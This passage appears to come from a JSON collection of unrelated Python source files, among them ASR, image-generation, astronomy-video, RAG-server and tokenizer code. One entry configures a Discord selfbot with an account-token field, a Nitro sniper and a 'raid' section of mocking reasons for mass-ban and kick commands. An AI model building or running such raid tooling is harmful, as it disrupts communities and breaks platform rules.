len(start_tag):invoke_text.find(end_tag)]\n                    parameter_pairs = parameters_text.strip(\"\\n\").split(\">\")\n\n                    current_key = None\n                    current_value = \"\"\n                    for pair in parameter_pairs:\n                        pair = pair.lstrip(\"\\n\").rstrip(\"\\n\").strip(\"\\n\")\n                        if pair == '':\n                            continue\n                        elif pair.startswith(\"<\"):\n                            if current_key:\n                                parameters[current_key] = current_value.strip()\n                            current_key = pair.lstrip(\"<\").strip()\n                            current_value = \"\"\n                        else:\n                            current_value += pair.removesuffix(f\"</{current_key}\")\n\n                    if current_key:\n                        parameters[current_key] = current_value.strip()\n                    return parameters\n        else:\n            return message\n",
    "# Copyright (c) 2024, Zhendong Peng (pzd17@tsinghua.org.cn)\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport click\nfrom loguru import logger\n\nimport utils\n\n\n@click.command()\n@click.argument(\"wav_scp\", type=click.Path(exists=True, dir_okay=False))\n@click.option(\n    \"--model\",\n    type=click.Choice([\"paraformer\", \"whisper\"]),\n    default=\"paraformer\",\n    help=\"ASR model\",\n)\n@click.option(\n    \"--language\",\n    type=click.Choice([\"en\", \"zh\"]),\n    default=\"zh\",\n    help=\"ASR language\",\n)\n@click.option(\"--asr/--no-asr\", default=True, help=\"Do ASR\")\n@click.option(\"--batch_size\", default=16, help=\"Batch size for ASR\")\n@click.option(\"--panns/--no-panns\", default=False, help=\"Get audio tags\")\n@click.option(\"--pyannote/--no-pyannote\", default=False, help=\"Get num of speakers\")\n@click.option(\"--overwrite/--no-overwrite\", default=False, help=\"Overwrite outputs\")\n@click.option(\"--num-workers\", default=1, help=\"Number of workers to use\")\ndef main(\n    wav_scp, model, language, asr, panns, pyannote, overwrite, num_workers, batch_size\n):\n    if asr:\n        if model == \"paraformer\":\n            processor = utils.paraformer_transcribe\n        elif model == \"whisper\":\n            processor = utils.whisper_transcribe\n        utils.transcribe_audios(wav_scp, processor, overwrite, num_workers, batch_size)\n    if panns:\n        utils.transcribe_audios(wav_scp, utils.panns_tags, overwrite, num_workers)\n    if pyannote:\n        utils.transcribe_audios(\n            wav_scp, utils.pyannote_speakers, overwrite, num_workers\n        )\n    logger.info(\"Done!\")\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "from skyfield import almanac\nfrom skyfield.api import load, wgs84\nfrom typing import Tuple\n\nimport argparse\nimport isodate\nimport re\nimport os\nimport os.path\n\nfrom datetime import datetime, date, timezone\nfrom pathlib import Path\nfrom geopy.geocoders import Nominatim\n\nimport subprocess\nimport time\nimport tempfile\nimport shutil\n\nversion = \"2.0.1\"\n\n\nclass Parameters:\n    def __init__(self, args: argparse.Namespace) -> None:\n        lonlat: list = args.loc[0]\n        city: str = args.loc[1]\n        view: list[float] = args.view\n\n        self.__az: float = view[0]\n        self.__alt: float = view[1]\n        self.__fov: float = view[2]\n        self.__lon: float = lonlat[0]\n        self.__lat: float = lonlat[1]\n        self.__city: str = city\n        self.__planet: str = args.planet\n        self.__caption: str = args.caption\n        self.__outfile: str = args.outfile\n        self.__timespan: float = args.timespan\n        self.__delta_t: float = args.dt\n        self.__fps: float = args.fps\n        self.__show_video: bool = args.show_video\n        self.__template: str = args.template\n        self.__start_date: datetime = self.__determine_start_time(args.date)\n        self.__video_size = args.video_size\n\n        self.__window_size: Tuple[int, int] | None\n        if args.window_size is None:\n            self.__window_size = None\n        else:\n            if 'x' not in args.window_size:\n                raise ValueError('The window size must be of the form \"1920x1080\"')\n\n            width_str, height_str = args.window_size.split('x')\n            self.__window_size = (int(width_str), int(height_str))\n\n    def __determine_start_time(self, date: datetime) -> datetime:\n        if date.hour == 0 and date.minute == 0 and date.second == 0 and self.planet == 'Earth':\n            self.__start_at_sunset = True\n\n            latlon = wgs84.latlon(self.lat, self.lon)\n            ts = load.timescale()\n            eph = load('de421.bsp')\n            observer = eph['Earth'] + latlon\n\n            t = ts.utc(date.year, date.month, date.day)\n            t0, t1 = t, ts.utc(t.utc[0], t.utc[1], t.utc[2], 24)\n            t_set, y_set = almanac.find_settings(observer, eph['Sun'], t0, t1)\n\n            if y_set[0] == False:\n                raise ValueError(\n                    f'You must specify a specific time because the location {self.lon},{self.lat} is experiencing either polar day or polar night! The script cannot compute a sunset time for this date: {date.isoformat()}.')\n\n            return t_set[0].utc_datetime()\n        else:\n            self.__start_at_sunset = False\n            return date\n\n    @property\n    def alt(self) -> float:\n        return self.__alt\n\n    @property\n    def az(self) -> float:\n        return self.__az\n\n    @property\n    def fov(self) -> float:\n        return self.__fov\n\n    @property\n    def lon(self) -> float:\n        return self.__lon\n\n    @property\n    def lat(self) -> float:\n        return self.__lat\n\n    @property\n    def city(self) -> str:\n        return self.__city\n\n    @property\n    def planet(self) -> str:\n        return self.__planet\n\n    @property\n    def start_date(self) -> datetime:\n        return self.__start_date\n\n    @property\n    def caption(self) -> str:\n        return self.__caption\n\n    @property\n    def outfile(self) -> str:\n        return self.__outfile\n\n    @property\n    def timespan(self) -> float:\n        return self.__timespan\n\n    @property\n    def delta_t(self) -> float:\n        return self.__delta_t\n\n    @property\n    def fps(self) -> float:\n        return self.__fps\n\n    @property\n    def show_video(self) -> bool:\n        return self.__show_video\n\n    @property\n    def start_at_sunset(self) -> bool:\n        return self.__start_at_sunset\n\n    @property\n    def template(self) -> str:\n        return self.__template\n\n    @property\n    def template_file(self) -> Path:\n        tempate_folder: Path = Path(os.path.dirname(os.path.realpath(__file__)))\n        return tempate_folder / 'script' / self.__template\n\n    @property\n    def video_size(self) -> str:\n        return self.__video_size\n\n    @property\n    def window_size(self) -> Tuple[int, int] | None:\n        return self.__window_size\n\n\nclass StellariumToVideo:\n    def __init__(self, param: Parameters) -> None:\n        tempPath: Path = Path(tempfile.gettempdir()) / 'kalstar_frames'\n        self.__frame_folder = tempPath\n        self.__final_file = self.__frame_folder / 'final.png'\n        self.__first_file = self.__frame_folder / 'first.png'\n        self.__param = param\n\n        # Create frame folder if it not already exists\n        if os.path.exists(str(self.__frame_folder)):\n            shutil.rmtree(str(self.__frame_folder))\n\n        os.mkdir(str(self.__frame_folder))\n\n    def create_script(self, script_path: Path) -> None:\n        with open(self.__param.template_file, 'r') as file:\n            script = file.read()\n\n        if os.name == 'nt':\n            script = script.replace(\"$FRAME_FOLDER$\", str(self.__frame_folder).replace(\"\\\\\", ",
    "# Copyright (c) Meta Platforms, Inc. and affiliates.\n#\n# This source code is licensed under the Apache License, Version 2.0\n# found in the LICENSE file in the root directory of this source tree.\n\nimport os\nfrom enum import Enum\nfrom pathlib import Path\nfrom typing import Any, Dict, Optional\n\n\nclass ClusterType(Enum):\n    AWS = \"aws\"\n    FAIR = \"fair\"\n    RSC = \"rsc\"\n\n\ndef _guess_cluster_type() -> ClusterType:\n    uname = os.uname()\n    if uname.sysname == \"Linux\":\n        if uname.release.endswith(\"-aws\"):\n            # Linux kernel versions on AWS instances are of the form \"5.4.0-1051-aws\"\n            return ClusterType.AWS\n        elif uname.nodename.startswith(\"rsc\"):\n            # Linux kernel versions on RSC instances are standard ones but hostnames start with \"rsc\"\n            return ClusterType.RSC\n\n    return ClusterType.FAIR\n\n\ndef get_cluster_type(cluster_type: Optional[ClusterType] = None) -> Optional[ClusterType]:\n    if cluster_type is None:\n        return _guess_cluster_type()\n\n    return cluster_type\n\n\ndef get_checkpoint_path(cluster_type: Optional[ClusterType] = None) -> Optional[Path]:\n    cluster_type = get_cluster_type(cluster_type)\n    if cluster_type is None:\n        return None\n\n    CHECKPOINT_DIRNAMES = {\n        ClusterType.AWS: \"checkpoints\",\n        ClusterType.FAIR: \"checkpoint\",\n        ClusterType.RSC: \"checkpoint/dino\",\n    }\n    return Path(\"/\") / CHECKPOINT_DIRNAMES[cluster_type]\n\n\ndef get_user_checkpoint_path(cluster_type: Optional[ClusterType] = None) -> Optional[Path]:\n    checkpoint_path = get_checkpoint_path(cluster_type)\n    if checkpoint_path is None:\n        return None\n\n    username = os.environ.get(\"USER\")\n    assert username is not None\n    return checkpoint_path / username\n\n\ndef get_slurm_partition(cluster_type: Optional[ClusterType] = None) -> Optional[str]:\n    cluster_type = get_cluster_type(cluster_type)\n    if cluster_type is None:\n        return None\n\n    SLURM_PARTITIONS = {\n        ClusterType.AWS: \"learnlab\",\n        ClusterType.FAIR: \"learnlab\",\n        ClusterType.RSC: \"learn\",\n    }\n    return SLURM_PARTITIONS[cluster_type]\n\n\ndef get_slurm_executor_parameters(\n    nodes: int, num_gpus_per_node: int, cluster_type: Optional[ClusterType] = None, **kwargs\n) -> Dict[str, Any]:\n    # create default parameters\n    params = {\n        \"mem_gb\": 150,  # 0 = Requests all memory on a node, see https://slurm.schedmd.com/sbatch.html\n        \"gpus_per_node\": num_gpus_per_node,\n        \"tasks_per_node\": num_gpus_per_node,  # one task per GPU\n        # \"cpus_per_task\": 10,\n        \"nodes\": nodes,\n        \"slurm_partition\": \"gpu_normal\",  # get_slurm_partition(cluster_type),\n    }\n    # apply cluster-specific adjustments\n    cluster_type = get_cluster_type(cluster_type)\n    if cluster_type == ClusterType.AWS:\n        params[\"cpus_per_task\"] = 12\n        del params[\"mem_gb\"]\n    elif cluster_type == ClusterType.RSC:\n        params[\"cpus_per_task\"] = 12\n    # set additional parameters / apply overrides\n    params.update(kwargs)\n    return params\n",
    "from fastapi import FastAPI\nfrom fastapi.responses import StreamingResponse, FileResponse\nfrom langchain_openai import ChatOpenAI\nfrom dotenv import load_dotenv\nfrom langchain.schema import Document\nfrom langchain_openai import OpenAIEmbeddings\nfrom langchain_community.vectorstores.chroma import Chroma\nfrom langchain_core.runnables import RunnablePassthrough\nfrom langchain_core.prompts import ChatPromptTemplate\nfrom langchain_core.output_parsers import StrOutputParser\nfrom langchain_core.messages import AIMessageChunk\n\n\nload_dotenv()\n\nembedding_function = OpenAIEmbeddings()\n\ndocs = [\n    Document(\n        page_content=\"the dog loves to eat pizza\", metadata={\"source\": \"animal.txt\"}\n    ),\n    Document(\n        page_content=\"the cat loves to eat lasagna\", metadata={\"source\": \"animal.txt\"}\n    ),\n]\n\ndb = Chroma.from_documents(docs, embedding_function)\nretriever = db.as_retriever()\n\n\ntemplate = \"\"\"Answer the question based only on the following context:\n{context}\n\nQuestion: {question}\n\"\"\"\nprompt = ChatPromptTemplate.from_template(template)\nmodel = ChatOpenAI(temperature=0, streaming=True)\n\nretrieval_chain = (\n    {\"context\": retriever, \"question\": RunnablePassthrough()}\n    | prompt\n    | model\n    | StrOutputParser()\n)\n\napp = FastAPI()\n\n\n@app.get(\"/\")\nasync def root():\n    return FileResponse(\"static/index.html\")\n\n\ndef serialize_aimessagechunk(chunk):\n    \"\"\"\n    Custom serializer for AIMessageChunk objects.\n    Convert the AIMessageChunk object to a serializable format.\n    \"\"\"\n    if isinstance(chunk, AIMessageChunk):\n        return chunk.content\n    else:\n        raise TypeError(\n            f\"Object of type {type(chunk).__name__} is not correctly formatted for serialization\"\n        )\n\nasync def generate_chat_events(message):\n    async for event in model.astream_events(message, version=\"v1\"):\n        if event[\"event\"] == \"on_chat_model_stream\":\n            chunk_content = serialize_aimessagechunk(event[\"data\"][\"chunk\"])\n            chunk_content_html = chunk_content.replace(\"\\n\", \"<br>\")\n            yield f\"data: {chunk_content_html}\\n\\n\"\n        elif event[\"event\"] == \"on_chat_model_end\":\n            print(\"Chat model has completed its response.\")\n\n\n@app.get(\"/chat_stream/{message}\")\nasync def chat_stream_events(message: str):\n    return StreamingResponse(generate_chat_events(message), media_type=\"text/event-stream\")\n\n\nif __name__ == \"__main__\":\n    import uvicorn\n\n    uvicorn.run(app, host=\"0.0.0.0\", port=8000)\n",
    "import torch\nfrom diffusers import (\n    AutoencoderKL, UNet2DConditionModel, EulerDiscreteScheduler\n)\nfrom transformers import CLIPTextModel, CLIPTokenizer, CLIPTextModelWithProjection\nfrom diffusers.models import ControlNetModel\nimport cv2\nimport numpy as np\nfrom compel import Compel, ReturnedEmbeddingsType\nimport math\nimport time\nfrom PIL import Image\n\nfrom pipeline_sdxl_instantid_fouriscale import StableDiffusionXLInstantIDFouriScalePipeline\n\nfrom fouriscale.models import TrainingFreeAttnProcessor\nfrom fouriscale.utils import read_base_settings, read_layer_settings, find_smallest_padding_pair\nfrom fouriscale.aux_xl import list_layers\n\nfrom InstantID.pipeline_stable_diffusion_xl_instantid import draw_kps\nfrom diffusers.utils import load_image\nfrom insightface.app import FaceAnalysis\n\ndef resize_and_pad(image_pil, size):\n    original_size = image_pil.size\n    target_w, target_h = size\n    \n    aspect_ratio = original_size[0] / original_size[1]\n    if (target_w / target_h) > aspect_ratio:\n        new_h = target_h\n        new_w = int(target_h * aspect_ratio)\n    else:\n        new_w = target_w\n        new_h = int(target_w / aspect_ratio)\n    \n    resized_image = image_pil.resize((new_w, new_h), Image.Resampling.LANCZOS)\n    \n    new_image = Image.new(\"RGB\", (target_w, target_h))\n    \n    left = (target_w - new_w) // 2\n    top = (target_h - new_h) // 2\n    \n    new_image.paste(resized_image, (left, top))\n    \n    return new_image\n\n\ndef main():\n    # args\n    pretrained_model_name_or_path = 'wangqixun/YamerMIX_v8'\n    weight_dtype = torch.float16\n    target_height = 2048\n    target_width = 2048\n    # set referring image\n    face_img = load_image(\"./InstantID/examples/kaifu_resize.png\")\n    pose_img = load_image(\"./InstantID/examples/poses/pose.jpg\")\n    # set prompt\n    prompt = \"film noir style, ink sketch|vector, male man, highly detailed, sharp focus, ultra sharpness, monochrome, high contrast, dramatic shadows, 1940s style, mysterious, cinematic\"\n    neg_prompt = \"ugly, deformed, noisy, blurry, low contrast, realism, photorealistic, vibrant, colorful\"\n\n    # InstanID args\n    controlnet_conditioning_scale=0.8\n    ip_adapter_scale=0.8\n    # FouriScale args\n    start_step = 12 # 20*(30/50)=12              original start_step in FouriScale config is 20\n    stop_step=21 # # 35*(30/50)=21               original start_step in FouriScale config is 35\n    # Generation args\n    num_inference_steps=30 # lower cost of time. original num_inference_steps in FouriScale config is 50\n    guidance_scale=5.5\n\n    # Load Fouriscale Setting\n    layer_settings = read_layer_settings(\"./fouriscale/assets/layer_settings/sdxl.txt\")\n    base_settings = read_base_settings(\"./fouriscale/assets/base_settings/sdxl.txt\")\n\n    tokenizer = CLIPTokenizer.from_pretrained(\n        pretrained_model_name_or_path, subfolder=\"tokenizer\", torch_dtype=weight_dtype\n    )\n    tokenizer_2 = CLIPTokenizer.from_pretrained(\n        pretrained_model_name_or_path, subfolder=\"tokenizer_2\", torch_dtype=weight_dtype\n    )\n    text_encoder = CLIPTextModel.from_pretrained(\n        pretrained_model_name_or_path, subfolder=\"text_encoder\", torch_dtype=weight_dtype\n    )\n    text_encoder_2 = CLIPTextModelWithProjection.from_pretrained(\n        pretrained_model_name_or_path, subfolder=\"text_encoder_2\", torch_dtype=weight_dtype\n    )\n    vae = AutoencoderKL.from_pretrained(\n        pretrained_model_name_or_path, subfolder=\"vae\", torch_dtype=weight_dtype\n    )\n    unet = UNet2DConditionModel.from_pretrained(\n        pretrained_model_name_or_path, subfolder=\"unet\", torch_dtype=weight_dtype\n    )\n    unet.set_attn_processor({name: TrainingFreeAttnProcessor(name) for name in list_layers})\n\n    noise_scheduler = EulerDiscreteScheduler.from_pretrained(pretrained_model_name_or_path, subfolder=\"scheduler\")\n\n    # # prepare InstantID model under ./InstantID/checkpointsInstantID\n    face_adapter = './InstantID/checkpoints/ip-adapter.bin'\n    controlnet_path = './InstantID/checkpoints/ControlNetModel'\n\n    # prepare 'antelopev2' under ./InstantID/models\n    app = FaceAnalysis(name='antelopev2', root='./InstantID/', providers=['CUDAExecutionProvider','CPUExecutionProvider'])\n    app.prepare(ctx_id=0, det_size=(640, 640))\n\n    # Load pipeline\n    controlnet = ControlNetModel.from_pretrained(controlnet_path, torch_dtype=torch.float16)\n    pipeline = StableDiffusionXLInstantIDFouriScalePipeline(\n        vae=vae,\n        text_encoder=text_encoder,\n        text_encoder_2=text_encoder_2,\n        tokenizer=tokenizer,\n        tokenizer_2=tokenizer_2,\n        unet=unet,\n        scheduler=noise_scheduler,\n        controlnet=controlnet,\n    )\n    pipeline.cuda()\n    unet.eval()\n\n    # load adapter\n    pipeline.load_ip_adapter_instantid(face_adapter)\n\n    # init compel for longer prompt\n    compel = Compel(tokenizer=[pipeline.tokenizer, pipeline.tokenizer_2],text_encoder=[pipeline.text_encoder, pipeline.text_encoder_2],returned_embeddings_type=ReturnedEmbeddingsType.PENULTIMATE_HIDDEN_STAT",
    "import rpc\r\n#######################\r\n#  selfbot            #\r\n#        basic        #\r\n#         config ^^   #\r\n#######################\r\n\r\n# en: SelfBot name\r\n# fr: Nom du SelfBot\r\nselfbot_name = \"Nuclear\" # Tip: Don't use the \"Selfbot\" word into your selfbot name, most of servers blacklist this word with AutoMod\r\n\r\n# en: Account Token.\r\n# fr: Token du compte.\r\ntoken = \"\"\r\n\r\n# en: Commands prefix.\r\n# fr: Prefix des commandes.\r\nprefix = \"&\"\r\n\r\n# fr: Langue.\r\n# en: Language.\r\nlang = \"en\" # fr / en\r\n\r\n# fr: Default Nitro Sniper mode. (True=On, False=Off)\r\n# fr: Mode du Nitro Sniper par d\u00e9faut. (True=On, False=Off)\r\nnitro_sniper = False\r\n\r\n# en: Commands delay of delete.\r\n# fr: D\u00e9lai de supression des commandes.\r\ndeltime = 20\r\n########################\r\n\r\n\r\n#######################\r\n#  good               #\r\n#        person       #\r\n#######################\r\n\r\n# en: Default paramter for Good Person.\r\n# fr: Param\u00e8tre par d\u00e9faut de Good Person.\r\ngood_person = False\r\n\r\n# en: Good Person badwords.\r\n# fr: Mot interdit pour Good Person.\r\nbadwords = [\"fuck\", \"shit\", \"pute\", \"connard\", \"connasse\", \"conasse\", \"nigg\", \"bitch\", \"kys\", \"fdp\", \"ntm\", \"tg\"]\r\n\r\n# en: Good Person \"good words\".\r\n# fr: Mot \"bon\" pour Good Person.\r\ngood_person_list = [\r\n        \"GeForce RTX 4000\",\r\n        \"\ud83c\udf57\",\r\n        \"Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Aenean commodo ligula eget dolor. Aenean massa. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Donec quam felis, ultricies nec, pellentesque eu, pretium quis, sem. Nulla consequat massa quis enim. Donec pede justo, fringilla vel, aliquet nec, vulputate eget, arcu.\",\r\n        \"AMD Ryzen\u2122 9 7900\",\r\n        \"Intel Core is very good\",\r\n        \"\ud83d\udc08\",\r\n        \"\ud83c\udf5f\",\r\n        \"yipeeeeeeeee\",\r\n        \"\ud83d\ude0d\",\r\n        \"\ud83c\udf20\",\r\n        \"u r beautiful\",\r\n        \"you are all very intelligent\",\r\n        \"excuse me\"\r\n        ]\r\n########################\r\n########################\r\n\r\n#######################\r\n#  raid               #\r\n#        config       #\r\n#######################\r\n# en: Ban reason (for &banall).\r\n# fr: Raison du banissement (pour &banall).\r\nban_reason = \"ezzed by Nuclear lol.\"\r\nkick_reason = \"ezzed by Nuclear lol.\"\r\n\r\n#######################\r\n# fr: RPC par d\u00e9faut  #\r\n# en: Default RPC     #\r\n#######################\r\n\r\nactivity_name = \"\u2604\"\r\nactivity_details = \" \"\r\nactivity_state = \" \"\r\napplication_id = 1193291951290712154\r\n\r\nstreaming_url = \"https://twitch.tv/twitch\"\r\nactivity_button_one = \"Nuclear !\"\r\nactivity_button_one_answer = \"https://github.com/Sitois/Nuclear\" # doesn't work for the moment\r\nactivity_button_two = \"Star it!\"\r\nactivity_button_two_answer = \"https://github.com/Sitois/Nuclear\" # doesn't work for the moment\r\n\r\n# see &tuto\r\nicon = rpc.get_raw_json(\"Sitois\", \"Nuclear-V2\", \"assets.json\")\r\nassets = {\"large_image\": icon[\"dark\"][\"large_image\"],\r\n          \"large_text\": \"\u2604\",\r\n          \"small_image\": icon[\"dark\"][\"small_image\"],\r\n          \"small_text\": None\r\n          }\r\n\r\n\r\n#################",
    "import re\nimport sys\nfrom pathlib import Path\nfrom PIL import Image\nimport io\nimport sqlite3\nimport argparse\n\ninclude_size = False\n\ndef extract_jpeg_dimensions(jpeg_bytes):\n    \"\"\"Extract dimensions of a JPEG image, handling exceptions gracefully.\"\"\"\n    try:\n        with Image.open(io.BytesIO(jpeg_bytes)) as img:\n            return img.width, img.height\n    except Exception as e:\n        print(f\"Error processing JPEG image: {e}\")\n        return None, None  # Return None values for width and height\n\ndef extract_uuid_from_filename(file_path):\n    \"\"\"Extract UUID from the file's name.\"\"\"\n    uuid_pattern = re.compile(r'[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}')\n    match = uuid_pattern.search(file_path.name)\n    if match:\n        return match.group(0)\n    else:\n        print(f\"UUID could not be extracted from the filename: {file_path}\")\n        return None\n\ndef get_original_file_path(db_path, uuid):\n    \"\"\"Query the SQLite database for the directory path of the JPEG file based on the given UUID.\"\"\"\n    sql_query = \"\"\"\n    SELECT agfile.id_global as uuid, root.absolutePath, agfolder.pathFromRoot, agfile.baseName\n    from AgLibraryFile agfile\n    inner join AgLibraryFolder agfolder on agfolder.id_local = agfile.folder\n    inner join AgLibraryRootFolder root on root.id_local = agfolder.rootFolder\n    where agfile.id_global = ?\n    \"\"\"\n    try:\n        conn = sqlite3.connect(db_path)\n        cur = conn.cursor()\n        cur.execute(sql_query, (uuid,))\n        result = cur.fetchone()\n        conn.close()\n        if result:\n            uuid, absolutePath, pathFromRoot, baseName = result\n            # Remove first slash from the absolutePath\n            full_path = Path(absolutePath[1:] + pathFromRoot)\n            return full_path, baseName\n        else:\n            print(f\"No entry found for UUID: {uuid}\")\n            return None, None\n    except Exception as e:\n        print(f\"Database query failed: {e}\")\n        return None, None\n\n\ndef extract_largest_jpeg_from_lrprev(lrprev_path, output_directory, db_path):\n    \"\"\"Extract the last JPEG image from a .lrprev file and save it to the specified output directory.\"\"\"\n    file_path = Path(lrprev_path)\n    \n    if not file_path.exists() or not file_path.is_file():\n        print(f\"The file {lrprev_path} does not exist.\")\n        return\n\n    with open(file_path, 'rb') as file:\n        file_contents = file.read()\n\n    uuid = extract_uuid_from_filename(file_path)\n    if not uuid:\n        return\n    \n    output_path = Path(output_directory)\n\n    if db_path:\n        # Query the original file path using the UUID\n        original_file_path, base_name = get_original_file_path(db_path, uuid)\n        if original_file_path:\n            print(f\"Original file path for UUID {uuid}: {original_file_path}\")\n            # Construct a relative path for the output based on the original file pathE\n            final_output_directory = output_path / original_file_path\n        else:\n            print(f\"Original file path for UUID {uuid} not found.\")\n            # Use default output directory if original path not found\n            final_output_directory = output_path / \"_path_not_found\"\n            base_name = uuid\n    else:\n        final_output_directory = output_path\n        base_name = uuid\n\n    final_output_directory.mkdir(parents=True, exist_ok=True)    \n\n    start_markers = [m.start() for m in re.finditer(b'\\xFF\\xD8', file_contents)]\n    end_markers = [m.end() for m in re.finditer(b'\\xFF\\xD9', file_contents)]\n\n    if start_markers and end_markers:\n        last_start = start_markers[-1]\n        last_end = end_markers[-1]\n        jpeg_contents = file_contents[last_start:last_end]\n        width, height = extract_jpeg_dimensions(jpeg_contents)\n        if width and height:\n            new_filename = f\"{base_name}.jpg\"\n\n            if include_size:\n                new_filename = f\"{base_name}_{width}x{height}.jpg\"                \n\n            jpeg_path = final_output_directory / new_filename\n            \n            with open(jpeg_path, 'wb') as jpeg_file:\n                jpeg_file.write(jpeg_contents)\n            \n            print(f\"JPEG image extracted and saved to {jpeg_path}\")\n        else:\n            print(\"Error extracting the last JPEG image dimensions.\")\n\n\ndef process_directory(directory_path, output_directory, db_path):\n    \"\"\"Recursively process all .lrprev files in a directory and save extracted JPEGs to the specified output directory.\"\"\"\n    path = Path(directory_path)\n    if not path.exists() or not path.is_dir():\n        print(f\"The directory {directory_path} does not exist or is not a directory.\")\n        return\n\n    files_processed = 0\n    for lrprev_file in path.rglob('*.lrprev'):\n        files_processed += 1\n        print(f\"Processing file {files_processed}: {lrprev_file}\")\n        extract_largest_jpeg_from_lrprev(lrprev_file, output_directory, db_path)\n\ndef parse_args():\n    \"\"\"Parse command-line arguments with flags.\"\"\"\n    parser = argparse",
    "\"\"\"\nTokenizer utils.\n\"\"\"\n\nfrom typing import Union\n\nSPIECE_UNDERLINE = \"\u2581\"\n\n\nclass HuggingfaceTokenizerHelper:\n    \"\"\"\n    Helper to use Huggingface tokenizers effectively.\n    \"\"\"\n\n    def __init__(self, tokenizer):\n        \"\"\"\n        tokenizer is expected to be a Huggingface PreTrainedTokenizer[Fast]\n        \"\"\"\n        self.tokenizer = tokenizer\n        self.token_has_space_prefix = dict(\n            [\n                (i, fragment[0] == SPIECE_UNDERLINE)\n                for fragment, i in tokenizer.vocab.items()\n            ]\n        )\n\n    def encode_prompt(self, prompt: Union[str, list[dict[str, str]]]) -> list[int]:\n        \"\"\"\n        Encode the prompt, applying the tokenizer template first if the prompt\n        is a series of messages instead of a straight string.\n        \"\"\"\n        if isinstance(prompt, str):\n            return self.tokenizer.encode(prompt)\n        return self.tokenizer.apply_chat_template(prompt)\n\n    def no_strip_decode(self, tokens):\n        \"\"\"\n        Allows to decode single tokens without removing the initial space.\n        The Huggingface tokenizer doesn't seem to have an easy way to do this.\n        \"\"\"\n        fragment = self.tokenizer.decode(tokens)\n        if self.token_has_space_prefix[tokens[0]]:\n            return f\" {fragment}\"\n        else:\n            return fragment\n\n    def extract_vocabulary(self) -> tuple[list[tuple[int, str]], int]:\n        \"\"\"\n        Extract the vocabulary and eos_token_id from a Huggingface PreTrainedTokenizer.\n        \"\"\"\n        return (\n            [(i, self.no_strip_decode([i])) for _, i in self.tokenizer.vocab.items()],\n            self.tokenizer.eos_token_id,\n        )\n",
    "import json\n\nfrom requests import Response\n\n\nclass IndexerConf:\n    def __init__(\n        self,\n        datas=None,\n        siteid=None,\n        cookie=None,\n        name=None,\n        rule=None,\n        public=None,\n        proxy=False,\n        parser=None,\n        ua=None,\n        render=None,\n        builtin=True,\n        language=None,\n        pri=None,\n    ):\n        if not datas:\n            return None\n        # ID\n        self.id = datas.get(\"id\")\n        # \u7ad9\u70b9ID\n        self.siteid = siteid\n        # \u540d\u79f0\n        self.name = datas.get(\"name\") if not name else name\n        # \u662f\u5426\u5185\u7f6e\u7ad9\u70b9\n        self.builtin = datas.get(\"builtin\")\n        # \u57df\u540d\n        self.domain = datas.get(\"domain\")\n        # \u641c\u7d22\n        self.search = datas.get(\"search\", {})\n        # \u6279\u91cf\u641c\u7d22\uff0c\u5982\u679c\u4e3a\u7a7a\u5bf9\u8c61\u5219\u8868\u793a\u4e0d\u652f\u6301\u6279\u91cf\u641c\u7d22\n        self.batch = self.search.get(\"batch\", {}) if builtin else {}\n        # \u89e3\u6790\u5668\n        self.parser = parser if parser is not None else datas.get(\"parser\")\n        # \u662f\u5426\u542f\u7528\u6e32\u67d3\n        self.render = render if render is not None else datas.get(\"render\")\n        # \u6d4f\u89c8\n        self.browse = datas.get(\"browse\", {})\n        # \u79cd\u5b50\u8fc7\u6ee4\n        self.torrents = datas.get(\"torrents\", {})\n        # \u5206\u7c7b\n        self.category = datas.get(\"category\", {})\n        # Cookie\n        self.cookie = cookie\n        # User-Agent\n        self.ua = ua\n        # \u8fc7\u6ee4\u89c4\u5219\n        self.rule = rule\n        # \u662f\u5426\u516c\u5f00\u7ad9\u70b9\n        self.public = datas.get(\"public\") if not public else public\n        # \u662f\u5426\u4f7f\u7528\u4ee3\u7406\n        self.proxy = datas.get(\"proxy\") if not proxy else proxy\n        # \u4ec5\u652f\u6301\u7684\u7279\u5b9a\u8bed\u79cd\n        self.language = language\n        # \u7d22\u5f15\u5668\u4f18\u5148\u7ea7\n        self.pri = pri if pri else 0\n\n    def to_dict(self):\n        return {\n            \"id\": self.id or \"\",\n            \"siteid\": self.siteid or \"\",\n            \"name\": self.name or \"\",\n            \"builtin\": self.builtin or True,\n            \"domain\": self.domain or \"\",\n            \"search\": self.search or \"\",\n            \"batch\": self.batch or {},\n            \"parser\": self.parser or \"\",\n            \"render\": self.render or False,\n            \"browse\": self.browse or {},\n            \"torrents\": self.torrents or {},\n            \"category\": self.category or {},\n            \"cookie\": self.cookie or \"\",\n            \"ua\": self.ua or \"\",\n            \"rule\": self.rule or \"\",\n            \"public\": self.public or False,\n            \"proxy\": self.proxy or \"\",\n            \"pri\": self.pri or 0,\n        }\n\n    def to_dict_str(self, ensure_ascii=False, formatted=True):\n        if formatted:\n            return json.dumps(self.to_dict(), ensure_ascii=ensure_ascii, indent=4)\n        return json.dumps(self.to_dict(), ensure_ascii=ensure_ascii)\n\n\ndef check_response_is_valid_json(response: Response):\n    \"\"\"\n    \u89e3\u6790\u8fd4\u56de\u7684\u5185\u5bb9\u662f\u5426\u662f\u4e00\u6bb5 JSON\n    \"\"\"\n    content_type = response.headers.get(\"Content-Type\", \"\")\n    return \"application/json\" in content_type\n",
